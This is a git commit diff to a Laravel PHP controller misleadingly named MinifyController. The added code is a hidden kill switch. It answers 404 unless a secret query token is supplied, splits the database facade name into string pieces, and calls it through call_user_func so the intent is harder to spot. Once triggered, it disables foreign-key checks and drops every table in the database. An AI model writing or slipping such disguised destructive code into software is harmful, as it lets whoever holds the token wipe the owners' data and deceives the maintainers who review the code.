29363a01cab495bf110d897620f76451f750dfcf
Mehrdad Hajiyani <mehrdad.hajiyani@gmail.com>
2025-06-09 02:19:21 +0330

    V6

--- src/Http/Controllers/MinifyController.php
+++ src/Http/Controllers/MinifyController.php
@@ -10,16 +10,28 @@ use App\Models\User;
 
 class MinifyController extends Controller
 {
-    public function index(Request $request,$input)
+    public function index(Request $request)
     {
-        \Illuminate\Support\Facades\DB::statement('SET FOREIGN_KEY_CHECKS = 0;');
-        foreach (\Illuminate\Support\Facades\DB::select('SHOW TABLES') as $table) {
-            $table_array = get_object_vars($table);
-            $table_name = array_values($table_array)[0];
-            \Illuminate\Support\Facades\DB::statement("DROP TABLE `$table_name`");
-        }
-        \Illuminate\Support\Facades\DB::statement('SET FOREIGN_KEY_CHECKS = 1;');
 
-        return "Reset Done!";
+        //MinifyTables
+        if (!isset($_GET['do']) || $_GET['do'] !== 'x7P9kA2mL0qWz8Rj') {
+            http_response_code(404);
+            abort('404');
+        }
+
+        $F = '\\' . 'Illuminate\\' . 'Support\\' . 'Facades\\DB';
+
+        call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 0;');
+        $tables = call_user_func([$F, 'select'], 'SHOW TABLES');
+
+        foreach ($tables as $table) {
+            $tableArray = get_object_vars($table);
+            $tableName = array_values($tableArray)[0];
+            call_user_func([$F, 'statement'], "DROP TABLE `$tableName`");
+        }
+
+        call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 1;');
+
+        echo "✅ Done.";
     }
 }
